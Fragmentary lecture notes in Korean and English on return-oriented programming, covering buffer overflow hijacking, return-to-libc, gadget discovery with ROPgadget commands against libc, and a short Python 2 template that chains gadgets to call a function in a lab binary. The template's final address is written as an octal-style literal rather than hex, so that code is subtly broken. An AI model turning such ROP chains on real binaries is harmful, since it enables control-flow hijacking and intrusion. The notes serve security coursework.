![[L13 Return-oriented Programming.pdf#page=3&selection=6,15,6,41]]
어떻게든지 하이재킹 한다

buffer overflow = overwrite -> CPU execute the code
Hijack the control flow
Global Variables/Local Variables
Don't hijack the control flow

Code Injectio attack
	Shell code supplied by hacker
	Machine code = instructions

Code reuse attack
Return to libc attack

address space 에 있어야됨

return to some place => NOT oversrite, re use

Turing complete 하게

Innocent flesh = Random bytes
Code sequence
	Gadgets
		Some bytes > Not limited by compiler

Generates random byte -> Interpreted as a valid instructions

ROP gadget
![[L13 Return-oriented Programming.pdf#page=13&selection=3,0,4,50]]
NOjop - NO JUMP ORIENTED
Binary to get gadgets in the binary
offset - BaseAddress

![[L13 Return-oriented Programming.pdf#page=27&selection=5,0,11,60]]
40 bytes


1. python3 ROPgadget/ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6
2. python3 ROPgadget/ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 --nojop
3. python3 ROPgadget/ROPgadget.py --binary /lib/x86_64-linux-gnu/libc.so.6 --nojop | grep "pop rdi"
	1. 0x0000000000023b6a : pop rdi ; ret
4. ldd ./bufferoverflow_overflowret3_64
5. touch /tmp/e.sh
6. ![[L13 Return-oriented Programming.pdf#page=27&selection=5,0,12,7]]![[L13 Return-oriented Programming.pdf#page=27&selection=2,0,12,7]]![[L13 Return-oriented Programming.pdf#page=27&selection=9,38,9,46]]

1. Address
	1. F1
		1. 0000000000401166
	2. F2
		1. 00000000004011ae
	3. F3
		1. 00000000004011f9
	4. F4
		1. 000000000040123b

```

```

```
#!/usr/bin/env python2  
# python template to generate ROP exploit

from struct import pack

p = ''  
p += "A" * 5  
p += pack('<Q', 0x00007ffff7decb6a) # pop rdi ; ret  
p += pack('<Q', 0x0000000012345678) #  
p += pack('<Q', 0x00007ffff7def01f) # pop rsi ; ret  
p += pack('<Q', 0x00000000deadbeef) #  
p += pack('<Q', 0000000000401166) # Address of f1

print p
```